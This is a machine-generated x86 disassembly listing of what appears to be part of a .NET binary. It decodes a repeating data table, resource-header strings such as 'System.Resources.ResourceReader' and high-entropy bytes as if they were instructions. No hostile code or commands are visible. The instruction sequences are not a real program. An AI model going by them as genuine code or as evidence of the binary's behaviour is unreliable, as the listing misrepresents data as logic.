  4046a6:	add    BYTE PTR [eax],al
  4046a8:	or     ch,BYTE PTR [edx]
  4046aa:	push   esi
  4046ab:	sub    BYTE PTR [esi],dl
  4046ad:	add    BYTE PTR [eax],al
  4046af:	push   es
  4046b0:	jb     0x404685
  4046b2:	push   es
  4046b3:	add    BYTE PTR [eax+0x7e],dh
  4046b6:	or     al,0x0
  4046b8:	add    BYTE PTR [edi+ebp*2],al
  4046bb:	scas   al,BYTE PTR es:[edi]
  4046bc:	add    BYTE PTR [eax],al
  4046be:	or     ch,BYTE PTR [edx]
  4046c0:	push   esi
  4046c1:	sub    BYTE PTR [esi],dl
  4046c3:	add    BYTE PTR [eax],al
  4046c5:	push   es
  4046c6:	jb     0x4046d9
  4046c8:	pop    es
  4046c9:	add    BYTE PTR [eax+0x7e],dh
  4046cc:	or     al,0x0
  4046ce:	add    BYTE PTR [edi+ebp*2],al
  4046d1:	scas   al,BYTE PTR es:[edi]
  4046d2:	add    BYTE PTR [eax],al
  4046d4:	or     ch,BYTE PTR [edx]
  4046d6:	push   esi
  4046d7:	sub    BYTE PTR [esi],dl
  4046d9:	add    BYTE PTR [eax],al
  4046db:	push   es
  4046dc:	jb     0x4046ff
  4046de:	pop    es
  4046df:	add    BYTE PTR [eax+0x7e],dh
  4046e2:	or     al,0x0
  4046e4:	add    BYTE PTR [edi+ebp*2],al
  4046e7:	scas   al,BYTE PTR es:[edi]
  4046e8:	add    BYTE PTR [eax],al
  4046ea:	or     ch,BYTE PTR [edx]
  4046ec:	push   esi
  4046ed:	sub    BYTE PTR [esi],dl
  4046ef:	add    BYTE PTR [eax],al
  4046f1:	push   es
  4046f2:	jb     0x404751
  4046f4:	pop    es
  4046f5:	add    BYTE PTR [eax+0x7e],dh
  4046f8:	or     al,0x0
  4046fa:	add    BYTE PTR [edi+ebp*2],al
  4046fd:	scas   al,BYTE PTR es:[edi]
  4046fe:	add    BYTE PTR [eax],al
  404700:	or     ch,BYTE PTR [edx]
  404702:	push   esi
  404703:	sub    BYTE PTR [esi],dl
  404705:	add    BYTE PTR [eax],al
  404707:	push   es
  404708:	jb     0x404783
  40470a:	pop    es
  40470b:	add    BYTE PTR [eax+0x7e],dh
  40470e:	or     al,0x0
  404710:	add    BYTE PTR [edi+ebp*2],al
  404713:	scas   al,BYTE PTR es:[edi]
  404714:	add    BYTE PTR [eax],al
  404716:	or     ch,BYTE PTR [edx]
  404718:	push   esi
  404719:	sub    BYTE PTR [esi],dl
  40471b:	add    BYTE PTR [eax],al
  40471d:	push   es
  40471e:	jb     0x4046d1
  404720:	pop    es
  404721:	add    BYTE PTR [eax+0x7e],dh
  404724:	or     al,0x0
  404726:	add    BYTE PTR [edi+ebp*2],al
  404729:	scas   al,BYTE PTR es:[edi]
  40472a:	add    BYTE PTR [eax],al
  40472c:	or     ch,BYTE PTR [edx]
  40472e:	push   esi
  40472f:	sub    BYTE PTR [esi],dl
  404731:	add    BYTE PTR [eax],al
  404733:	push   es
  404734:	jb     0x404707
  404736:	pop    es
  404737:	add    BYTE PTR [eax+0x7e],dh
  40473a:	or     al,0x0
  40473c:	add    BYTE PTR [edi+ebp*2],al
  40473f:	scas   al,BYTE PTR es:[edi]
  404740:	add    BYTE PTR [eax],al
  404742:	or     ch,BYTE PTR [edx]
  404744:	push   esi
  404745:	sub    BYTE PTR [esi],dl
  404747:	add    BYTE PTR [eax],al
  404749:	push   es
  40474a:	jb     0x40474d
  40474c:	or     BYTE PTR [eax],al
  40474e:	jo     0x4047ce
  404750:	or     al,0x0
  404752:	add    BYTE PTR [edi+ebp*2],al
  404755:	scas   al,BYTE PTR es:[edi]
  404756:	add    BYTE PTR [eax],al
  404758:	or     ch,BYTE PTR [edx]
  40475a:	push   esi
  40475b:	sub    BYTE PTR [esi],dl
  40475d:	add    BYTE PTR [eax],al
  40475f:	push   es
  404760:	jb     0x404791
  404762:	or     BYTE PTR [eax],al
  404764:	jo     0x4047e4
  404766:	or     al,0x0
  404768:	add    BYTE PTR [edi+ebp*2],al
  40476b:	scas   al,BYTE PTR es:[edi]
  40476c:	add    BYTE PTR [eax],al
  40476e:	or     ch,BYTE PTR [edx]
  404770:	push   esi
  404771:	sub    BYTE PTR [esi],dl
  404773:	add    BYTE PTR [eax],al
  404775:	push   es
  404776:	jb     0x4047ad
  404778:	or     BYTE PTR [eax],al
  40477a:	jo     0x4047fa
  40477c:	or     al,0x0
  40477e:	add    BYTE PTR [edi+ebp*2],al
  404781:	scas   al,BYTE PTR es:[edi]
  404782:	add    BYTE PTR [eax],al
  404784:	or     ch,BYTE PTR [edx]
  404786:	push   esi
  404787:	sub    BYTE PTR [esi],dl
  404789:	add    BYTE PTR [eax],al
  40478b:	push   es
  40478c:	jb     0x4047cf
  40478e:	or     BYTE PTR [eax],al
  404790:	jo     0x404810
  404792:	or     al,0x0
  404794:	add    BYTE PTR [edi+ebp*2],al
  404797:	scas   al,BYTE PTR es:[edi]
  404798:	add    BYTE PTR [eax],al
  40479a:	or     ch,BYTE PTR [edx]
  40479c:	push   esi
  40479d:	sub    BYTE PTR [esi],dl
  40479f:	add    BYTE PTR [eax],al
  4047a1:	push   es
  4047a2:	jb     0x404803
  4047a4:	or     BYTE PTR [eax],al
  4047a6:	jo     0x404826
  4047a8:	or     al,0x0
  4047aa:	add    BYTE PTR [edi+ebp*2],al
  4047ad:	scas   al,BYTE PTR es:[edi]
  4047ae:	add    BYTE PTR [eax],al
  4047b0:	or     ch,BYTE PTR [edx]
  4047b2:	push   esi
  4047b3:	sub    BYTE PTR [esi],dl
  4047b5:	add    BYTE PTR [eax],al
  4047b7:	push   es
  4047b8:	jb     0x40482d
  4047ba:	or     BYTE PTR [eax],al
  4047bc:	jo     0x40483c
  4047be:	or     al,0x0
  4047c0:	add    BYTE PTR [edi+ebp*2],al
  4047c3:	scas   al,BYTE PTR es:[edi]
  4047c4:	add    BYTE PTR [eax],al
  4047c6:	or     ch,BYTE PTR [edx]
  4047c8:	push   esi
  4047c9:	sub    BYTE PTR [esi],dl
  4047cb:	add    BYTE PTR [eax],al
  4047cd:	push   es
  4047ce:	jb     0x40475b
  4047d0:	or     BYTE PTR [eax],al
  4047d2:	jo     0x404852
  4047d4:	or     al,0x0
  4047d6:	add    BYTE PTR [edi+ebp*2],al
  4047d9:	scas   al,BYTE PTR es:[edi]
  4047da:	add    BYTE PTR [eax],al
  4047dc:	or     ch,BYTE PTR [edx]
  4047de:	push   esi
  4047df:	sub    BYTE PTR [esi],dl
  4047e1:	add    BYTE PTR [eax],al
  4047e3:	push   es
  4047e4:	jb     0x404783
  4047e6:	or     BYTE PTR [eax],al
  4047e8:	jo     0x404868
  4047ea:	or     al,0x0
  4047ec:	add    BYTE PTR [edi+ebp*2],al
  4047ef:	scas   al,BYTE PTR es:[edi]
  4047f0:	add    BYTE PTR [eax],al
  4047f2:	or     ch,BYTE PTR [edx]
  4047f4:	push   esi
  4047f5:	sub    BYTE PTR [esi],dl
  4047f7:	add    BYTE PTR [eax],al
  4047f9:	push   es
  4047fa:	jb     0x4047a9
  4047fc:	or     BYTE PTR [eax],al
  4047fe:	jo     0x40487e
  404800:	or     al,0x0
  404802:	add    BYTE PTR [edi+ebp*2],al
  404805:	scas   al,BYTE PTR es:[edi]
  404806:	add    BYTE PTR [eax],al
  404808:	or     ch,BYTE PTR [edx]
  40480a:	push   esi
  40480b:	sub    BYTE PTR [esi],dl
  40480d:	add    BYTE PTR [eax],al
  40480f:	push   es
  404810:	jb     0x4047e5
  404812:	or     BYTE PTR [eax],al
  404814:	jo     0x404894
  404816:	or     al,0x0
  404818:	add    BYTE PTR [edi+ebp*2],al
  40481b:	scas   al,BYTE PTR es:[edi]
  40481c:	add    BYTE PTR [eax],al
  40481e:	or     ch,BYTE PTR [edx]
  404820:	push   esi
  404821:	sub    BYTE PTR [esi],dl
  404823:	add    BYTE PTR [eax],al
  404825:	push   es
  404826:	jb     0x404823
  404828:	or     BYTE PTR [eax],al
  40482a:	jo     0x4048aa
  40482c:	or     al,0x0
  40482e:	add    BYTE PTR [edi+ebp*2],al
  404831:	scas   al,BYTE PTR es:[edi]
  404832:	add    BYTE PTR [eax],al
  404834:	or     ch,BYTE PTR [edx]
  404836:	push   esi
  404837:	sub    BYTE PTR [esi],dl
  404839:	add    BYTE PTR [eax],al
  40483b:	push   es
  40483c:	jb     0x404853
  40483e:	or     DWORD PTR [eax],eax
  404840:	jo     0x4048c0
  404842:	or     al,0x0
  404844:	add    BYTE PTR [edi+ebp*2],al
  404847:	scas   al,BYTE PTR es:[edi]
  404848:	add    BYTE PTR [eax],al
  40484a:	or     ch,BYTE PTR [edx]
  40484c:	push   esi
  40484d:	sub    BYTE PTR [esi],dl
  40484f:	add    BYTE PTR [eax],al
  404851:	push   es
  404852:	jb     0x404883
  404854:	or     DWORD PTR [eax],eax
  404856:	jo     0x4048d6
  404858:	or     al,0x0
  40485a:	add    BYTE PTR [edi+ebp*2],al
  40485d:	scas   al,BYTE PTR es:[edi]
  40485e:	add    BYTE PTR [eax],al
  404860:	or     ch,BYTE PTR [edx]
  404862:	push   esi
  404863:	sub    BYTE PTR [esi],dl
  404865:	add    BYTE PTR [eax],al
  404867:	push   es
  404868:	jb     0x4048cb
  40486a:	or     DWORD PTR [eax],eax
  40486c:	jo     0x4048ec
  40486e:	or     al,0x0
  404870:	add    BYTE PTR [edi+ebp*2],al
  404873:	scas   al,BYTE PTR es:[edi]
  404874:	add    BYTE PTR [eax],al
  404876:	or     ch,BYTE PTR [edx]
  404878:	push   esi
  404879:	sub    BYTE PTR [esi],dl
  40487b:	add    BYTE PTR [eax],al
  40487d:	push   es
  40487e:	jb     0x404817
  404880:	or     DWORD PTR [eax],eax
  404882:	jo     0x404902
  404884:	or     al,0x0
  404886:	add    BYTE PTR [edi+ebp*2],al
  404889:	scas   al,BYTE PTR es:[edi]
  40488a:	add    BYTE PTR [eax],al
  40488c:	or     ch,BYTE PTR [edx]
  40488e:	push   esi
  40488f:	sub    BYTE PTR [esi],dl
  404891:	add    BYTE PTR [eax],al
  404893:	push   es
  404894:	jb     0x40485d
  404896:	or     DWORD PTR [eax],eax
  404898:	jo     0x404918
  40489a:	or     al,0x0
  40489c:	add    BYTE PTR [edi+ebp*2],al
  40489f:	scas   al,BYTE PTR es:[edi]
  4048a0:	add    BYTE PTR [eax],al
  4048a2:	or     ch,BYTE PTR [edx]
  4048a4:	push   esi
  4048a5:	sub    BYTE PTR [esi],dl
  4048a7:	add    BYTE PTR [eax],al
  4048a9:	push   es
  4048aa:	jb     0x4048a5
  4048ac:	or     DWORD PTR [eax],eax
  4048ae:	jo     0x40492e
  4048b0:	or     al,0x0
  4048b2:	add    BYTE PTR [edi+ebp*2],al
  4048b5:	scas   al,BYTE PTR es:[edi]
  4048b6:	add    BYTE PTR [eax],al
  4048b8:	or     ch,BYTE PTR [edx]
  4048ba:	push   esi
  4048bb:	sub    BYTE PTR [esi],dl
  4048bd:	add    BYTE PTR [eax],al
  4048bf:	push   es
  4048c0:	jb     0x4048df
  4048c2:	or     al,BYTE PTR [eax]
  4048c4:	jo     0x404944
  4048c6:	or     al,0x0
  4048c8:	add    BYTE PTR [edi+ebp*2],al
  4048cb:	scas   al,BYTE PTR es:[edi]
  4048cc:	add    BYTE PTR [eax],al
  4048ce:	or     ch,BYTE PTR [edx]
  4048d0:	push   esi
  4048d1:	sub    BYTE PTR [esi],dl
  4048d3:	add    BYTE PTR [eax],al
  4048d5:	push   es
  4048d6:	jb     0x40492d
  4048d8:	or     al,BYTE PTR [eax]
  4048da:	jo     0x40495a
  4048dc:	or     al,0x0
  4048de:	add    BYTE PTR [edi+ebp*2],al
  4048e1:	scas   al,BYTE PTR es:[edi]
  4048e2:	add    BYTE PTR [eax],al
  4048e4:	or     ch,BYTE PTR [edx]
  4048e6:	push   esi
  4048e7:	sub    BYTE PTR [esi],dl
  4048e9:	add    BYTE PTR [eax],al
  4048eb:	push   es
  4048ec:	jb     0x40487b
  4048ee:	or     al,BYTE PTR [eax]
  4048f0:	jo     0x404970
  4048f2:	or     al,0x0
  4048f4:	add    BYTE PTR [edi+ebp*2],al
  4048f7:	scas   al,BYTE PTR es:[edi]
  4048f8:	add    BYTE PTR [eax],al
  4048fa:	or     ch,BYTE PTR [edx]
  4048fc:	push   esi
  4048fd:	sub    BYTE PTR [esi],dl
  4048ff:	add    BYTE PTR [eax],al
  404901:	push   es
  404902:	jb     0x4048cd
  404904:	or     al,BYTE PTR [eax]
  404906:	jo     0x404986
  404908:	or     al,0x0
  40490a:	add    BYTE PTR [edi+ebp*2],al
  40490d:	scas   al,BYTE PTR es:[edi]
  40490e:	add    BYTE PTR [eax],al
  404910:	or     ch,BYTE PTR [edx]
  404912:	push   esi
  404913:	sub    BYTE PTR [esi],dl
  404915:	add    BYTE PTR [eax],al
  404917:	push   es
  404918:	jb     0x4048fb
  40491a:	or     al,BYTE PTR [eax]
  40491c:	jo     0x40499c
  40491e:	or     al,0x0
  404920:	add    BYTE PTR [edi+ebp*2],al
  404923:	scas   al,BYTE PTR es:[edi]
  404924:	add    BYTE PTR [eax],al
  404926:	or     ch,BYTE PTR [edx]
  404928:	push   esi
  404929:	sub    BYTE PTR [esi],dl
  40492b:	add    BYTE PTR [eax],al
  40492d:	push   es
  40492e:	jb     0x40492f
  404930:	or     al,BYTE PTR [eax]
  404932:	jo     0x4049b2
  404934:	or     al,0x0
  404936:	add    BYTE PTR [edi+ebp*2],al
  404939:	scas   al,BYTE PTR es:[edi]
  40493a:	add    BYTE PTR [eax],al
  40493c:	or     ch,BYTE PTR [edx]
  40493e:	push   esi
  40493f:	sub    BYTE PTR [esi],dl
  404941:	add    BYTE PTR [eax],al
  404943:	push   es
  404944:	jb     0x40498b
  404946:	or     eax,DWORD PTR [eax]
  404948:	jo     0x4049c8
  40494a:	or     al,0x0
  40494c:	add    BYTE PTR [edi+ebp*2],al
  40494f:	scas   al,BYTE PTR es:[edi]
  404950:	add    BYTE PTR [eax],al
  404952:	or     ch,BYTE PTR [edx]
  404954:	push   esi
  404955:	sub    BYTE PTR [esi],dl
  404957:	add    BYTE PTR [eax],al
  404959:	push   es
  40495a:	jb     0x4048e9
  40495c:	or     eax,DWORD PTR [eax]
  40495e:	jo     0x4049de
  404960:	or     al,0x0
  404962:	add    BYTE PTR [edi+ebp*2],al
  404965:	scas   al,BYTE PTR es:[edi]
  404966:	add    BYTE PTR [eax],al
  404968:	or     ch,BYTE PTR [edx]
  40496a:	push   esi
  40496b:	sub    BYTE PTR [esi],dl
  40496d:	add    BYTE PTR [eax],al
  40496f:	push   es
  404970:	jb     0x40493f
  404972:	or     eax,DWORD PTR [eax]
  404974:	jo     0x4049f4
  404976:	or     al,0x0
  404978:	add    BYTE PTR [edi+ebp*2],al
  40497b:	scas   al,BYTE PTR es:[edi]
  40497c:	add    BYTE PTR [eax],al
  40497e:	or     ch,BYTE PTR [edx]
  404980:	push   esi
  404981:	sub    BYTE PTR [esi],dl
  404983:	add    BYTE PTR [eax],al
  404985:	push   es
  404986:	jb     0x4049a9
  404988:	or     al,0x0
  40498a:	jo     0x404a0a
  40498c:	or     al,0x0
  40498e:	add    BYTE PTR [edi+ebp*2],al
  404991:	scas   al,BYTE PTR es:[edi]
  404992:	add    BYTE PTR [eax],al
  404994:	or     ch,BYTE PTR [edx]
  404996:	push   esi
  404997:	sub    BYTE PTR [esi],dl
  404999:	add    BYTE PTR [eax],al
  40499b:	push   es
  40499c:	jb     0x4049f1
  40499e:	or     al,0x0
  4049a0:	jo     0x404a20
  4049a2:	or     al,0x0
  4049a4:	add    BYTE PTR [edi+ebp*2],al
  4049a7:	scas   al,BYTE PTR es:[edi]
  4049a8:	add    BYTE PTR [eax],al
  4049aa:	or     ch,BYTE PTR [edx]
  4049ac:	push   esi
  4049ad:	sub    BYTE PTR [esi],dl
  4049af:	add    BYTE PTR [eax],al
  4049b1:	push   es
  4049b2:	jb     0x404a27
  4049b4:	or     al,0x0
  4049b6:	jo     0x404a36
  4049b8:	or     al,0x0
  4049ba:	add    BYTE PTR [edi+ebp*2],al
  4049bd:	scas   al,BYTE PTR es:[edi]
  4049be:	add    BYTE PTR [eax],al
  4049c0:	or     ch,BYTE PTR [edx]
  4049c2:	push   esi
  4049c3:	sub    BYTE PTR [esi],dl
  4049c5:	add    BYTE PTR [eax],al
  4049c7:	push   es
  4049c8:	jb     0x40494d
  4049ca:	or     al,0x0
  4049cc:	jo     0x404a4c
  4049ce:	or     al,0x0
  4049d0:	add    BYTE PTR [edi+ebp*2],al
  4049d3:	scas   al,BYTE PTR es:[edi]
  4049d4:	add    BYTE PTR [eax],al
  4049d6:	or     ch,BYTE PTR [edx]
  4049d8:	push   esi
  4049d9:	sub    BYTE PTR [esi],dl
  4049db:	add    BYTE PTR [eax],al
  4049dd:	push   es
  4049de:	jb     0x4049a7
  4049e0:	or     al,0x0
  4049e2:	jo     0x404a62
  4049e4:	or     al,0x0
  4049e6:	add    BYTE PTR [edi+ebp*2],al
  4049e9:	scas   al,BYTE PTR es:[edi]
  4049ea:	add    BYTE PTR [eax],al
  4049ec:	or     ch,BYTE PTR [edx]
  4049ee:	push   esi
  4049ef:	sub    BYTE PTR [esi],dl
  4049f1:	add    BYTE PTR [eax],al
  4049f3:	push   es
  4049f4:	jb     0x4049d1
  4049f6:	or     al,0x0
  4049f8:	jo     0x404a78
  4049fa:	or     al,0x0
  4049fc:	add    BYTE PTR [edi+ebp*2],al
  4049ff:	scas   al,BYTE PTR es:[edi]
  404a00:	add    BYTE PTR [eax],al
  404a02:	or     ch,BYTE PTR [edx]
  404a04:	push   esi
  404a05:	sub    BYTE PTR [esi],dl
  404a07:	add    BYTE PTR [eax],al
  404a09:	push   es
  404a0a:	jb     0x4049f7
  404a0c:	or     al,0x0
  404a0e:	jo     0x404a8e
  404a10:	or     al,0x0
  404a12:	add    BYTE PTR [edi+ebp*2],al
  404a15:	scas   al,BYTE PTR es:[edi]
  404a16:	add    BYTE PTR [eax],al
  404a18:	or     ch,BYTE PTR [edx]
  404a1a:	push   esi
  404a1b:	sub    BYTE PTR [esi],dl
  404a1d:	add    BYTE PTR [eax],al
  404a1f:	push   es
  404a20:	jb     0x404a27
  404a22:	or     eax,0xc7e7000
  404a27:	add    BYTE PTR [eax],al
  404a29:	add    al,0x6f
  404a2b:	scas   al,BYTE PTR es:[edi]
  404a2c:	add    BYTE PTR [eax],al
  404a2e:	or     ch,BYTE PTR [edx]
  404a30:	push   eax
  404a31:	add    BYTE PTR ss:[eax],al
  404a34:	into   
  404a35:	retf   0xbeef
  404a38:	add    DWORD PTR [eax],eax
  404a3a:	add    BYTE PTR [eax],al
  404a3c:	xchg   ecx,eax
  404a3d:	add    BYTE PTR [eax],al
  404a3f:	add    BYTE PTR [ebx+edx*2+0x79],ch
  404a43:	jae    0x404ab9
  404a45:	gs ins DWORD PTR es:[edi],dx
  404a47:	cs push edx
  404a49:	gs jae 0x404abb
  404a4c:	jne    0x404ac0
  404a4e:	arpl   WORD PTR [ebp+0x73],sp
  404a51:	cs push edx
  404a53:	gs jae 0x404ac5
  404a56:	jne    0x404aca
  404a58:	arpl   WORD PTR [ebp+0x52],sp
  404a5b:	gs popa 
  404a5d:	fs gs jb 0x404a8d
  404a61:	and    BYTE PTR [ebp+0x73],ch
  404a64:	arpl   WORD PTR [edi+0x72],bp
  404a67:	ins    BYTE PTR es:[edi],dx
  404a68:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  404a6f:	jae    0x404ada
  404a71:	outs   dx,DWORD PTR ds:[esi]
  404a72:	outs   dx,BYTE PTR ds:[esi]
  404a73:	cmp    eax,0x2e302e34
  404a78:	xor    BYTE PTR [esi],ch
  404a7a:	xor    BYTE PTR [eax+eiz*1],ch
  404a7d:	inc    ebx
  404a7e:	jne    0x404aec
  404a80:	je     0x404af7
  404a82:	jb     0x404ae9
  404a84:	cmp    eax,0x7475656e
  404a89:	jb     0x404aec
  404a8b:	ins    BYTE PTR es:[edi],dx
  404a8c:	sub    al,0x20
  404a8e:	push   eax
  404a8f:	jne    0x404af3
  404a91:	ins    BYTE PTR es:[edi],dx
  404a92:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  404a99:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  404a9d:	bound  esi,QWORD PTR [edi]
  404a9f:	aaa    
  404aa0:	popa   
  404aa1:	xor    eax,0x31363563
  404aa6:	cmp    DWORD PTR [ebx],esi
  404aa8:	xor    al,0x65
  404aaa:	xor    BYTE PTR [eax],bh
  404aac:	cmp    DWORD PTR [ebx],esp
  404aae:	push   ebx
  404aaf:	jns    0x404b24
  404ab1:	je     0x404b18
  404ab3:	ins    DWORD PTR es:[edi],dx
  404ab4:	cs push edx
  404ab6:	gs jae 0x404b28
  404ab9:	jne    0x404b2d
  404abb:	arpl   WORD PTR [ebp+0x73],sp
  404abe:	cs push edx
  404ac0:	jne    0x404b30
  404ac2:	je     0x404b2d
  404ac4:	ins    DWORD PTR es:[edi],dx
  404ac5:	gs push edx
  404ac7:	gs jae 0x404b39
  404aca:	jne    0x404b3e
  404acc:	arpl   WORD PTR [ebp+0x53],sp
  404acf:	gs je  0x404ad4
  404ad2:	add    BYTE PTR [eax],al
  404ad4:	add    BYTE PTR [ebp+0x0],al
  404ad7:	add    BYTE PTR [eax],al
  404ad9:	add    BYTE PTR [eax],al
  404adb:	add    BYTE PTR [eax],al
  404add:	push   eax
  404ade:	inc    ecx
  404adf:	inc    esp
  404ae0:	push   eax
  404ae1:	inc    ecx
  404ae2:	inc    esp
  404ae3:	push   eax
  404ae4:	lds    esi,FWORD PTR [edi-0x1c]
  404ae7:	add    BYTE PTR [eax-0x42794f22],0xce
  404aee:	and    al,BYTE PTR [edi-0x7699fe6c]
  404af4:	dec    esi
  404af5:	cmp    DWORD PTR [edx],eax
  404af7:	xchg   esi,eax
  404af8:	or     edx,DWORD PTR [edi+0x90e96bb]
  404afe:	jne    0x404a99
  404b00:	cmp    eax,0x3f9b5b7b
  404b05:	imul   esi,DWORD PTR [edx],0xf95fbf9e
  404b0b:	mov    ds:0xa9c55b3b,eax
  404b10:	and    eax,0x62b8c7b9
  404b15:	imul   ebp,DWORD PTR [edi-0x43],0xffffffda
  404b19:	push   edx
  404b1a:	ds mov esi,0xbf3d1035
  404b20:	cli    
  404b21:	sar    BYTE PTR [ebp-0x3c],0xe0
  404b25:	or     BYTE PTR [esi+eax*8],dh
  404b28:	repz inc edi
  404b2a:	mov    dh,0xca
  404b2c:	lea    esp,[ebx-0x2feb312b]
  404b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b33:	aam    0x9c
  404b35:	dec    ebx
  404b36:	fs (bad) 
  404b39:	jmp    0x404ae0
  404b3b:	fild   QWORD PTR [ebx+ebx*1-0x605f2047]
  404b42:	hlt    
  404b43:	loope  0x404b1e
  404b45:	lock imul ch
  404b48:	mov    ah,0x7c
  404b4a:	add    eax,0x32e04aee
  404b4f:	div    al
  404b51:	fnstcw WORD PTR [edi-0x4]
  404b54:	pop    ds
  404b55:	jae    0x404bb0
  404b57:	add    BYTE PTR [eax],cl
  404b59:	fadd   DWORD PTR [eax]
  404b5c:	fst    QWORD PTR [ecx]
  404b5e:	dec    DWORD PTR [ebx]
  404b60:	mov    eax,0xa0c66e7
  404b65:	inc    esp
  404b66:	fmul   DWORD PTR [edx+eax*8]
  404b69:	xor    bl,BYTE PTR [eax+edx*1]
  404b6c:	addr16 push cs
  404b6e:	enter  0x310,0x9b
  404b72:	mov    bh,0x16
  404b74:	inc    esi
  404b76:	call   0x86f21a91
  404b7b:	sbb    bl,ah
  404b7d:	push   edx
  404b7e:	cli    
  404b7f:	sbb    eax,0x1f2fa70b
  404b84:	pusha  
  404b85:	mov    cl,0xc4
  404b87:	daa    
  404b88:	or     al,0xbf
  404b8a:	add    al,0x29
  404b8c:	imul   edi,eax,0xffffff8d
  404b8f:	xor    bl,ch
  404b91:	stc    
  404b92:	inc    eax
  404b93:	aas    
  404b94:	inc    ebx
  404b95:	test   BYTE PTR [edi+0x45],dh
  404b98:	jnp    0x404bbe
  404b9a:	cli    
  404b9b:	inc    edi
  404b9c:	enter  0x6183,0x4d
  404ba0:	daa    
  404ba1:	xchg   edi,eax
  404ba2:	stos   DWORD PTR es:[edi],eax
  404ba3:	push   esp
  404ba4:	inc    esi
  404ba5:	jecxz  0x404be4
  404ba7:	push   esi
  404ba8:	inc    edx
  404ba9:	or     ebp,DWORD PTR [edx+0x77621956]
  404baf:	pop    edx
  404bb0:	lock aam 0xb0
  404bb3:	pop    ebp
  404bb4:	push   edx
  404bb5:	inc    edx
  404bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bb7:	pusha  
  404bb8:	jecxz  0x404b60
  404bba:	lea    esp,[ecx-0x64]
  404bbd:	ds int3 
  404bbf:	popa   
  404bc0:	(bad)  
  404bc1:	sub    eax,0xe1346390
  404bc6:	mul    BYTE PTR [ebp+esi*4-0x5e]
  404bca:	xchg   esp,eax
  404bcb:	outs   dx,BYTE PTR ds:[esi]
  404bcc:	mov    DWORD PTR [edi-0x67879059],ebp
  404bd2:	shl    BYTE PTR [edx-0x4f],0xe8
  404bd6:	mov    DWORD PTR [esi-0xb],esi
  404bd9:	shl    DWORD PTR [edi-0x18f9818a],0x76
  404be0:	test   DWORD PTR [ecx-0x79],eax
  404be3:	ja     0x404c27
  404be5:	dec    BYTE PTR [edi+esi*2+0x77f3058b]
  404bec:	iret   
  404bed:	mov    ebp,0xc82578cc
  404bf2:	jg     0x404c70
  404bf4:	mov    dh,BYTE PTR [eax+0xcb7f7f]
  404bfa:	add    BYTE PTR [eax],al
  404bfc:	sahf   
  404bfd:	add    al,0x0
  404bff:	add    ah,bh
  404c01:	add    al,0x0
  404c03:	add    BYTE PTR [esi+0x16000003],cl
  404c09:	add    DWORD PTR [eax],eax
  404c0b:	add    BYTE PTR ds:0x49000004,ch
  404c11:	add    eax,DWORD PTR [eax]
  404c13:	add    BYTE PTR [ebx],bl
  404c15:	add    BYTE PTR [eax],al
  404c17:	add    cl,ah
  404c19:	add    eax,DWORD PTR [eax]
  404c1b:	add    BYTE PTR [eax],al
  404c1d:	add    BYTE PTR [eax],al
  404c1f:	add    al,dl
  404c21:	add    al,BYTE PTR [eax]
  404c23:	add    BYTE PTR [ecx+0x1],cl
  404c26:	add    BYTE PTR [eax],al
  404c28:	pop    edx
  404c29:	add    eax,DWORD PTR [eax]
  404c2b:	add    BYTE PTR [esi],cl
  404c2d:	push   es
  404c2e:	add    BYTE PTR [eax],al
  404c30:	jp     0x404c38
  404c32:	add    BYTE PTR [eax],al
  404c34:	ret    0x6
  404c37:	add    bh,bl
  404c39:	push   es
  404c3a:	add    BYTE PTR [eax],al
  404c3c:	push   ss
  404c3d:	or     DWORD PTR [eax],eax
  404c3f:	add    BYTE PTR [ebx+0xa],dl
  404c42:	add    BYTE PTR [eax],al
  404c44:	data16 or al,BYTE PTR [eax]
  404c47:	add    bl,bh
  404c49:	or     DWORD PTR [eax],eax
  404c4b:	add    BYTE PTR [edx],dh
  404c4d:	add    BYTE PTR [eax],al
  404c4f:	add    BYTE PTR [ebp+0x71000005],cl
  404c55:	add    eax,DWORD PTR [eax]
  404c57:	add    BYTE PTR [ecx+ecx*1+0x31b0000],ah
  404c5e:	add    BYTE PTR [eax],al
  404c60:	fld    QWORD PTR [eax+eax*1]
  404c63:	add    BYTE PTR [edi],dh
  404c65:	add    eax,0x5be0000
  404c6a:	add    BYTE PTR [eax],al
  404c6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c6d:	push   es
  404c6e:	add    BYTE PTR [eax],al
  404c70:	cmp    al,BYTE PTR [ebx]
  404c72:	add    BYTE PTR [eax],al
  404c74:	pop    ss
  404c75:	or     BYTE PTR [eax],al
  404c77:	add    bh,al
  404c79:	add    eax,0x3a70000
  404c7e:	add    BYTE PTR [eax],al
  404c80:	test   DWORD PTR ds:0x5d60000,0x74d0000
  404c8a:	add    BYTE PTR [eax],al
  404c8c:	fadd   QWORD PTR [edi]
  404c8e:	add    BYTE PTR [eax],al
  404c90:	sub    DWORD PTR [esi],eax
  404c92:	add    BYTE PTR [eax],al
  404c94:	push   edx
  404c95:	or     BYTE PTR [eax],al
  404c97:	add    ch,cl
  404c99:	or     BYTE PTR [eax],al
  404c9b:	add    BYTE PTR [ebx-0x6effffff],dh
  404ca1:	or     BYTE PTR [eax],al
  404ca3:	add    al,bh
  404ca5:	add    eax,DWORD PTR [eax]
  404ca7:	add    BYTE PTR [edx+0x61000000],dl
  404cad:	or     DWORD PTR [eax],eax
  404caf:	add    BYTE PTR [edx+0x4],cl
  404cb2:	add    BYTE PTR [eax],al
  404cb4:	push   ecx
  404cb5:	push   es
  404cb6:	add    BYTE PTR [eax],al
  404cb8:	ds push es
  404cba:	add    BYTE PTR [eax],al
  404cbc:	mov    ch,0x7
  404cbe:	add    BYTE PTR [eax],al
  404cc0:	cdq    
  404cc1:	add    al,BYTE PTR [eax]
  404cc3:	add    BYTE PTR [edi+0x0],ah
  404cc6:	add    BYTE PTR [eax],al
  404cc8:	lods   eax,DWORD PTR ds:[esi]
  404cc9:	or     al,BYTE PTR [eax]
  404ccb:	add    BYTE PTR [edi],ah
  404ccd:	add    al,BYTE PTR [eax]
  404ccf:	add    dl,dh
  404cd1:	add    DWORD PTR [eax],eax
  404cd3:	add    BYTE PTR [eax+ecx*1+0x48b0000],ch
  404cda:	add    BYTE PTR [eax],al
  404cdc:	add    BYTE PTR [edi],0x0
  404cdf:	add    BYTE PTR [edx+0x5],bl
  404ce2:	add    BYTE PTR [eax],al
  404ce4:	inc    edx
